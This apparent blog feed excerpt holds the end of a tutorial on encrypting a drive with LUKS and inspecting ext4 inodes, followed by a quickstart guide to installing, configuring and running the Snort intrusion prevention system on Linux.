The commands I used for this are below. The values for the start and ending offsets when creating the partitions can be expressed in both percentages and exact byte values. Reference the <a href="https://linux.die.net/man/8/parted">man page</a> for more details.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>parted -s /dev/sdb mklabel gpt  
</span></span><span style="display:flex;"><span>parted -s /dev/sdb mkpart primary ext4 0% 50MiB
</span></span></code></pre></div><h2 id="encrypting-thedrive">Encrypting the Drive</h2>
<p>This demonstrates how to encrypt file system using LUKS. It is important to remember the passphrase that you enter while encrypting the partition because it is a key piece of information when decrypting the drive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cryptsetup luksFormat /dev/sdb # encrypt /dev/sdb with luks
</span></span></code></pre></div><h2 id="decrypting-thedrive">Decrypting the Drive</h2>
<p>You’ll need to do this before you’re able to mount and use the partition on the drive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cryptsetup open /dev/sdb encrypted # open the encrypted drive as /dev/mapper/encrypted  
</span></span><span style="display:flex;"><span>mkfs.ext4 /dev/mapper/encrypted # create a filesystem on the device (only needed the first time you open the encrypted drive)
</span></span></code></pre></div><h2 id="mounting-the-partition">Mounting the Partition</h2>
<p>In order to actually use the partition and the file system on it, we must mount it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mkdir -p /mnt/encrypted # prepare the mount point  
</span></span><span style="display:flex;"><span>mount /dev/mapper/encrypted /mnt/encrypted # mount the decrypted filesystem on /mnt/encrypted
</span></span></code></pre></div><h2 id="unmounting-the-partition">Unmounting the Partition</h2>
<p>When you’re done using the drive, you can unmount it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>umount /mnt/encrypted 
</span></span></code></pre></div><h2 id="closing-and-re-encrypting-the-partition">Closing and Re-encrypting the Partition</h2>
<p>In its unmounted state, it is still decrypted. To re-encrypt and close the drive, you can run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cryptsetup close /dev/mapper/encrypted
</span></span></code></pre></div><h1 id="digging-deeper">Digging Deeper</h1>
<p>Because I’m a curious person, I’ll share with you some commands that you can use to get more information on the file system that you just created and other findings that I thought were interesting.</p>
<h2 id="file-systemmetadata">File System Metadata</h2>
<p>After decrypting the drive, you can view the metadata of your filesystem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cryptsetup --type luks open /dev/sdb encrypted
</span></span></code></pre></div><p>These are some commands that will give you infromation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>df -hT /dev/mapper/encrypted  
</span></span><span style="display:flex;"><span>tune2fs -l /dev/sdb
</span></span></code></pre></div><p>As shown in the screenshots, you’re able to view the number of inodes, the block count, block size, filesystem magic number, and much more.</p>
<h2 id="inodes"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*k6QJaeh0pBMsxnfbGk6Rog.png" alt=""  />

<img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*BXNCkBoJaesaE0AfBZlOsQ.png" alt=""  />

Inodes</h2>
<p><a href="https://en.wikipedia.org/wiki/Inode">Inodes</a> are a data structure that contain information about files in the Linux filesystem. It contains metadata such as the block number that the file is located in on the hard drive, permissions, and file owner. In an ext4 filesystem, the number of inodes in is fixed, whereas in XFS and JFS, the number of inodes is dynamic. The result is that in ext4 filesystems where many inodes are used, such as in situations where many directories, symbolic links, and/or small files are made, an error message that the system is out of space may occur when there is plenty of space left. The reason for this is simply that the filesystem has no more available inodes to assign to new files. This is a relatively common occurence for mail servers that often hold many small files.</p>
<p>The number of inodes on your system’s filesystems can be viewed with <code>df -hi</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_TgsDD7BK_fPitV0J31ywg.png" alt=""  />

You can query the inode information on a specific file with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ls -il file
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nBvEce088HNvxUbcz1cF7w.png" alt=""  />

The inode number is on the leftmost column of output. In this case, it is <code>131079</code>. Additionally, you can see the read, write, and execute permissions on the file with the owner and group associated with it.</p>
<p>As an alternative, you can search for the file that is associated with a specific inode with this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>find / -inum 1234567 -ls
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*15DlndsZGVZ0Q9A3lAtXeg.png" alt=""  />

I was able to find the file <code>/tmp/test.txt</code> that was associated with <code>131079</code>.</p>
<h2 id="duplicating-the-encrypted-drive">Duplicating the Encrypted Drive</h2>
<p>This command can be used to create an exact duplicate of <code>/dev/sdb</code> in <code>/media/sdb.img</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dd if=/dev/sdb of=/media/sdb.img
</span></span></code></pre></div><h1 id="next-steps"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*hzoKv4rgFMHTAQtFFIcaYQ.png" alt=""  />

Next Steps</h1>
<p>Moving forward, you can expand upon what was done in this article by implementing an added layer of abstraction and flexibility with <a href="https://linuxconfig.org/linux-lvm-logical-volume-manager">LVM</a>. You can also continue to experiment with different ways of encrypting partitions such as those outlined in <a href="https://www.baeldung.com/linux/encrypt-partition">this article</a>. There are many different ways to configure your system and I would encourage you to continue learning. Thank you for reading!</p>
]]></content:encoded>
    </item>
    <item>
      <title>Snort IPS Quickstart</title>
      <link>https://ally-petitt.com:443/en/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.&lt;/p&gt;
&lt;p&gt;In this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.&lt;/p&gt;
&lt;h1 id=&#34;quick-install&#34;&gt;Quick Install&lt;/h1&gt;
&lt;p&gt;You can install this on Ubuntu easily with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install snort
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;kali-linux&#34;&gt;Kali Linux&lt;/h2&gt;
&lt;p&gt;For my Kali friends, you might get the message that you’re unable to locate the &lt;code&gt;snort&lt;/code&gt; package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain &lt;code&gt;snort&lt;/code&gt;. To fix this, you can try to append the following repos to your &lt;code&gt;/etc/apt/sources.list&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://http.kali.org/kali kali-rolling main non-free contrib  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://http.kali.org/kali sana main non-free contrib  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://security.kali.org/kali-security sana/updates main contrib non-free  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://old.kali.org/kali moto main non-free contrib
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let the changes take effect and install Snort.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get update  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install snort
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;building-fromsource&#34;&gt;Building From Source&lt;/h1&gt;
&lt;p&gt;If you’re crazy enough to build Snort from the source code, this section is for you.&lt;/p&gt;
&lt;h2 id=&#34;installing-dependencies&#34;&gt;Installing Dependencies&lt;/h2&gt;
&lt;p&gt;Before you can build Snort, you must first install its dependencies. These are listed in their &lt;a href=&#34;https://github.com/snort3/snort3#dependencies&#34;&gt;README.md&lt;/a&gt; on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y gcc libpcre3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev zlib1g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libluajit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libpcap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev openssl libssl&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libnghttp2&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libdumbnet&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bison flex libdnet autoconf libtool cmake
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;daq&#34;&gt;DAQ&lt;/h2&gt;
&lt;p&gt;Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called &lt;code&gt;daq&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ unzip v3.0.11.zip -d daq &amp;amp;&amp;amp; cd daq/libdaq-3.0.11
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After downloading and extracting it, I’ll run &lt;code&gt;bootstrap&lt;/code&gt; to generate the configuration script and then proceed to install it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./bootstrap  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;hwloc&#34;&gt;hwloc&lt;/h2&gt;
&lt;p&gt;Another dependency is &lt;code&gt;hwloc&lt;/code&gt;. You can find additional methods of installation on their &lt;a href=&#34;https://github.com/open-mpi/hwloc&#34;&gt;GitHub&lt;/a&gt; and &lt;a href=&#34;https://www.open-mpi.org/software/hwloc/v2.9/&#34;&gt;website&lt;/a&gt;. This is the way that I did it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/open-mpi/hwloc.git  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cd hwloc &amp;amp;&amp;amp; ./autogen.sh  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;openssl&#34;&gt;OpenSSL&lt;/h2&gt;
&lt;p&gt;If you don’t already have &lt;code&gt;openssl&lt;/code&gt; installed on your system, you could install it from source:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/openssl/openssl.git &amp;amp;&amp;amp; cd openssl  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./Configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It is also possible to install it through &lt;code&gt;apt&lt;/code&gt;. You may still need to install some additional headers for Snort to work. For this, you can try&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt install libssl-dev openssl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;snort-install&#34;&gt;Snort Install&lt;/h2&gt;
&lt;p&gt;Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in &lt;a href=&#34;https://github.com/snort3/snort3#readme&#34;&gt;GitHub&lt;/a&gt;, I clone their GitHub repository and run these commands:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/snort3/snort3.git  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cd snort3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, I’ll build the program. You’ll need &lt;code&gt;cmake&lt;/code&gt; among other packages in order to do this, so I’ve included the install command for those packages.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; sudo apt install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y gcc cmake libpcre3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev zlib1g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libluajit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libpcap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev openssl libssl&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libnghttp2&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libdumbnet&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev bison flex autoconf libtool  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;configure\_cmake&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sh &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;prefix&lt;span style=&#34;color:#f92672&#34;&gt;=$&lt;/span&gt;(pwd) &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;with&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;daq&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;libraries&lt;span style=&#34;color:#f92672&#34;&gt;=/&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;to&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;libdaq&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; cd build  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; make &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;j &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;(nproc) install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;configuration&#34;&gt;Configuration&lt;/h1&gt;
&lt;h2 id=&#34;capturing-all-networktraffic&#34;&gt;Capturing all Network Traffic&lt;/h2&gt;
&lt;p&gt;To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo ip link set wlan0 promisc on
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;modifying-the-configuration-file&#34;&gt;Modifying the Configuration File&lt;/h2&gt;
&lt;p&gt;Most configurations will go within &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*pngRmEDDXcscoXuasWQFdQ.png&#34; alt=&#34;&#34;  /&gt;

On line 45 of the configuration file, we’ll change the value of &lt;code&gt;HOME_NET&lt;/code&gt; from &lt;code&gt;any&lt;/code&gt; to be the network that you would like to monitor. In my case, it is &lt;code&gt;192.168.1.0/24&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*uPIpmb3Q2AUJj3v3GkL2lQ.png&#34; alt=&#34;&#34;  /&gt;

I would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.&lt;/p&gt;
&lt;p&gt;Rules are included in step #7. The syntax for rule files is &lt;code&gt;include /path/to/rule.rules&lt;/code&gt;. In this case, &lt;code&gt;$RULE_PATH&lt;/code&gt; refers to &lt;code&gt;/etc/snort&lt;/code&gt;. You can include multiple rule files and add your own under &lt;code&gt;/etc/snort/local.rules&lt;/code&gt; or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Pz6IDFwxqQwrMWmZS83kQg.png&#34; alt=&#34;&#34;  /&gt;

As a side note, if you would like to download the latest community rules, you can find them at the &lt;a href=&#34;https://www.snort.org/downloads#rules&#34;&gt;official website&lt;/a&gt;. You would extract the tarball and add the rule files to your &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; wget https:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;snort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;downloads&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snort3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rules&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; tar &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xf snort3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rules&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;running-snort&#34;&gt;Running Snort&lt;/h1&gt;
&lt;p&gt;Once you have your configuration file created, you can test that everything works with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4STD2kRrAx3xnRfCA7ALqA.png&#34; alt=&#34;&#34;  /&gt;

To actually run Snort as a daemon, you would change the &lt;code&gt;-T&lt;/code&gt; option to &lt;code&gt;-D&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo snort -D -i eth0 -c /etc/snort/snort.conf  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Spawning daemon child...  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;My daemon child 197993 lives...  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Daemon parent exiting (0)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To verify that it is working, you can use &lt;code&gt;ps aux&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ps aux | grep snort  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All alerts from Snort will be sent to &lt;code&gt;/var/log/snort/alert&lt;/code&gt; unless otherwise specified in a command line argument.&lt;/p&gt;
